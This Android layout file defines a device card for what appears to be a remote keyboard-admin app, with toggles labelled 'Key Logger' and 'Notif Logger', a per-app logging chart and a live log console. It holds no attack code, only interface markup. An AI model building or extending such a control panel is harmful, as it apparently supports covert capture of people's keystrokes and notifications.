<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"
    android:background="@drawable/card_background"
    android:padding="16dp"
    android:layout_marginBottom="16dp">

    <!-- Device Header -->
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:gravity="center_vertical"
        android:layout_marginBottom="12dp">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="📱"
            android:textSize="20sp"
            android:layout_marginRight="8dp" />

        <TextView
            android:id="@+id/txtDeviceName"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Device Name"
            android:textSize="18sp"
            android:textStyle="bold"
            android:textColor="#1A1A1A" />

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="ONLINE"
            android:textSize="10sp"
            android:textStyle="bold"
            android:textColor="#388E3C"
            android:background="#E8F5E9"
            android:paddingLeft="8dp"
            android:paddingRight="8dp"
            android:paddingTop="4dp"
            android:paddingBottom="4dp" />
    </LinearLayout>

    <!-- Toggle Buttons -->
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:layout_marginBottom="12dp">

        <Button
            android:id="@+id/btnToggleKeyLog"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Key Logger: ..."
            android:textSize="11sp"
            android:textStyle="bold"
            android:background="#388E3C"
            android:textColor="#FFFFFF"
            android:layout_marginRight="6dp" />

        <Button
            android:id="@+id/btnToggleNotifLog"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Notif Logger: ..."
            android:textSize="11sp"
            android:textStyle="bold"
            android:background="#388E3C"
            android:textColor="#FFFFFF"
            android:layout_marginLeft="6dp" />
    </LinearLayout>

    <!-- Individual App Logging Volume Chart Header -->
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Individual App Logging Volume:"
        android:textStyle="bold"
        android:textSize="12sp"
        android:textColor="#555555"
        android:layout_marginBottom="4dp" />

    <!-- Individual Horizontal Bar Chart View -->
    <com.example.mykeyboardadmin.HorizontalBarChartView
        android:id="@+id/deviceBarChart"
        android:layout_width="match_parent"
        android:layout_height="140dp"
        android:layout_marginBottom="12dp" />

    <!-- Log Console Header -->
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Individual Device Activity &amp; Logs:"
        android:textStyle="bold"
        android:textSize="12sp"
        android:textColor="#555555"
        android:layout_marginBottom="6dp" />

    <!-- Scrollable Terminal Log Console -->
    <ScrollView
        android:id="@+id/logScrollView"
        android:layout_width="match_parent"
        android:layout_height="140dp"
        android:fillViewport="true"
        android:background="#1E1E1E"
        android:padding="10dp">

        <TextView
            android:id="@+id/txtDeviceLogConsole"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="Listening for device events..."
            android:textSize="11sp"
            android:textColor="#00FF00"
            android:fontFamily="monospace" />
    </ScrollView>

</LinearLayout>
